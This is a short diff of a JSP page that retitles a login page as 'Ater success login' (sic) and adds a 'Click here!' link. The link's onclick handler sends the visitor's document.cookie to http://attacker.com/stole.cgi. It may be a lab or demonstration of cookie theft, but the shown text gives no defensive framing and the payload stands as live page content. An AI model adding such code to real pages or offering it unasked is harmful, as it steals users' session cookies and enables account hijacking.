@@ -4,9 +4,10 @@
 <html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
-<title>Login jsp</title>
+<title>Ater success login</title>
 </head>
 <body>
-<p>Login page</p>
+<p>Ater success login</p>
+<a href="#" onclick="window.location='http://attacker.com/stole.cgi?text='+escape(document.cookie); return false;">Click here!</a>
 </body>
 </html>
